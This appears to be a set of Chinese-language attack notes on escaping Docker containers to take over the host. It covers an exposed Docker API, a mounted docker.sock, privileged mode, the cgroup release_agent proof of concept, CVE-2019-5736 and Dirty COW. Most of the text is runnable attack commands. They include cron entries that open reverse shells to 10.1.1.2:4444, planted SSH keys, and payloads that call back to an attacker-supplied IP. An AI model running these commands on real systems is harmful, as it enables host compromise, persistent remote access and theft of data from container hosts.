	    一个工具https://github.com/stealthcopter/deepce
	    二个工具https://github.com/gabrtv/shocker
  #### 判断是否在docker容器中
	    检查/.dockerenv文件是否存在
	    检查/proc/1/cgroup内是否包含"docker"等字符串。
	    mount、fdisk -l查看硬盘 、判断PID 1的进程名
  #### 配置不当引发的逃逸
	    挂载点/在宿主/mnt目录
	    >docker -H tcp://10.1.1.1:2375 run -it -v /:/mnt nginx:latest /bin/bash
	    容器内执行
	    >echo '* * * * * /bin/bash -i >& /dev/tcp/10.1.1.2/4444 0>&1' >> /mnt/var/spool/cron/crontabs/root
	    本地监听4444，获得宿主机shell
  #### Docker sock
	    Docker.sock 是一个 Unix 套接字，它使 Docker 服务器端守护进程 dockerd 能够通过 REST API 与其命令行接口进行通信。 套接字显示为 /var/run/docker.sock 文件。 因为它是一个文件，管理员可以在容器中共享和运行 docker.sock，然后使用它与该容器进行通信。 运行 docker.sock 的容器可以启动或停止其他容器，在主机上创建镜像或写入主机文件系统。 这一切意味着当您运行“docker”命令行工具时，它实际上是在与 docker 套接字通信。
	    有时开发人员会将 docker 套接字安装在 docker 容器内，以便他们可以管理其他容器。 这通常使用以下命令完成：：
	    docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest
	    注意“-v /var/run/docker.sock:/var/run/docker.sock”选项，这个标志将在 docker 容器内挂载 docker 套接字。 攻击者所要做的就是下载 docker CLI，他们将完全控制 docker API，这将允许他们删除容器、创建容器、执行命令或其他任何他们想要的东西
	    容器内找到docker.sock
	    >find / -name docker.sock
	    容器内查看宿主机信息
	    >docker -H unix:///var/位置 info
	    运行一个容器挂载宿主机根路径
	    >docker -H unix:///var/位置 run -it -v /:/test ubuntu /bin/bash
	    查看宿主机文件
	    >ls /test
  #### 特权用户
	    Docker image如果使用“--privileged”标志运行，该标志禁用 Docker 提供的所有保护和隔离。运行“fdisk -l”并接收输出，可认为特权身份允许。
	    剩下要做的就是将主机文件系统挂载到“/dev/sda1”
	    >mkdir /test
	    >mount /dev/sda1 /test,读取宿主机文件。
	    写入计划任务
	    >echo '* * * * * /bin/bash -i >& /dev/tcp/10.1.1.2/4444 0>&1' >> /test/var/spool/cron/crontabs/root
	    本地监听返回shell
	    或挂在root目录后写入私钥文件
	    >docker run -itd -v /root:/root ubuntu:18.04 /bin/bash
	    >mkdir /root/.ssh
	    >cat id_rsa.pub >> /root/.ssh/authorized_keys
	    还可以尝试以下 POC 漏洞利用代码：
```bash
    d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
    mkdir -p $d/w;echo 1 >$d/w/notify_on_release
    t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    touch /o;
    echo $t/c >$d/release_agent;
    echo "#!/bin/sh $1 >$t/o" >/c;
    chmod +x /c;
    sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
  #### CVE-2019-5736
	    条件Docker < 18.09.2，runc< 1.0-rc6（docker ；docker-runc查看版本）
	    git clone https://github.com/Frichetten/CVE-2019-5736-PoC
	    >vim main.go
	    >payload = "#!/bin/bash \n bash -i >& /dev/tcp/YOURIP/1234 0>&1"
	    编译
	    >CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
	    复制到容器上执行
	    管理员通过exec进入容器，触发Payload
  #### CVE-2019-14271
  #### 脏牛漏洞实现Docker逃逸
	    >git clone https://github.com/gebl/dirtycow-docker-vdso.git
	    >cd dirtycow-docker-vdso/
	    >sudo docker-compose run dirtycow /bin/bash
	    >cd /dirtycow-vdso/
	    >make
	    >./xx YOURIP:1234